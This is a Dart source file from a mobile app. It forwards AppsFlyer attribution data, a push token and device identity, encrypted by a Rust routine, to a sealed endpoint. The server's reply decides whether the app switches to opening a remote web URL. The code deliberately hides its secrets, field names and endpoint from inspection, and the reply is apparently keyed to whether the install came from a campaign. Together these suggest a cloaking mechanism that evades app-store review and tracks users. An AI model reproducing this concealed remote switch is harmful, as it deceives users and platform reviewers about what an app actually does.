// DecreeFetch — single-shot POST to the sealed edge/sync endpoint.
//
// We NEVER build the JSON envelope here. The payload is handed to the
// Rust `rg_pack` entry point which:
//   • reads the HMAC secret, field names, schema rev, UA default
//     straight from its sealed slots;
//   • performs XOR-SHA keystream encryption + HMAC-SHA256 tag;
//   • returns ready-to-send JSON bytes.
//
// This way the keystream secret and the field names/alphabet never show
// up on the Dart heap.
//
// Body shape: we forward the ENTIRE install conversion payload and the
// ENTIRE deep-link click-event verbatim, then overlay our own identity
// fields (bundle_id / os / store_id / af_id / push_token /
// is_first_launch). The backend keys off AppsFlyer field names
// directly (af_sub1…5, deep_link_value, deep_link_sub1, shortlink,
// match_type, …) — mapping or dropping fields on the client has
// previously caused partner sites to miss required sub_ids.

import 'dart:convert';
import 'dart:io' show Platform;
import 'dart:math' as math;

import '../../prism/rust_guard.dart';
import '../../prism/sealed_bytes.dart';
import '../compass/harbor.dart';
import '../current/anchor_vault.dart';
import 'chime_bridge.dart';
import 'wire_runner.dart';

class DecreeFetch {
  DecreeFetch._();
  static final DecreeFetch instance = DecreeFetch._();

  final _rng = math.Random.secure();

  Future<Decree?> ask({
    required bool isFirstLaunch,
    required Map<String, dynamic> breadcrumbs,
  }) async {
    // Start from the raw AppsFlyer payload — includes af_sub1…5,
    // media_source, campaign, campaign_id, deep_link_value,
    // deep_link_sub1…10, shortlink, match_type, agency, …
    final body = <String, dynamic>{...breadcrumbs};

    // Identity + plumbing — overlay last so backend-required fields
    // win over anything AppsFlyer may have shipped with the same key.
    final mediaSource = (breadcrumbs['media_source'] ?? '').toString();
    final afStatus = (breadcrumbs['af_status'] ?? '').toString();
    body['af_status'] = afStatus.isNotEmpty
        ? afStatus
        : (mediaSource.isNotEmpty ? 'Non-organic' : 'Organic');
    body['bundle_id'] = Sealed.bundleId;
    body['os'] = Platform.isAndroid ? 'Android' : 'iOS';
    body['store_id'] = Sealed.bundleId;
    body['is_first_launch'] = isFirstLaunch;

    final pushToken = ChimeBridge.instance.lastToken ??
        (await AnchorVault.instance.readAttribution())['push_token'];
    if (pushToken != null && pushToken.toString().isNotEmpty) {
      body['push_token'] = pushToken;
    }

    final fbProj = Sealed.fbProjectNum;
    if (fbProj.isNotEmpty) body['firebase_project_id'] = fbProj;

    // Normalise null-ish strings AppsFlyer sometimes ships ("null").
    body.removeWhere((k, v) => v == null || v.toString() == 'null');

    assert(() {
      // ignore: avoid_print
      print('[DecreeFetch] body=${jsonEncode(body)}');
      return true;
    }());

    final rawBody = utf8.encode(jsonEncode(body));
    final nonce = List<int>.generate(16, (_) => _rng.nextInt(256));
    final envelopeBytes = RustGuard.instance.pack(rawBody, nonce);
    if (envelopeBytes.isEmpty) return null;

    final uri = Uri.parse(Sealed.edgeEndpoint);
    try {
      final res = await WireRunner.instance
          .postJson(uri, utf8.decode(envelopeBytes));
      assert(() {
        // ignore: avoid_print
        print('[DecreeFetch] status=${res.statusCode} body=${res.body}');
        return true;
      }());
      if (res.statusCode != 200) return null;
      final decoded = jsonDecode(res.body);
      if (decoded is! Map) return null;
      final ok = decoded['ok'] == true;
      if (!ok) {
        await AnchorVault.instance.rememberDecree(openWeb: false);
        return const Decree(openWeb: false);
      }
      final url = decoded['url'];
      final exp = decoded['expires'];
      DateTime? expAt;
      if (exp is int) {
        expAt = DateTime.fromMillisecondsSinceEpoch(exp * 1000);
      }
      if (url is String && url.startsWith('http')) {
        await AnchorVault.instance.rememberDecree(openWeb: true, url: url);
        return Decree(openWeb: true, url: url, expiresAt: expAt);
      }
      await AnchorVault.instance.rememberDecree(openWeb: false);
      return const Decree(openWeb: false);
    } catch (e) {
      assert(() {
        // ignore: avoid_print
        print('[DecreeFetch] error $e');
        return true;
      }());
      return null;
    }
  }
}
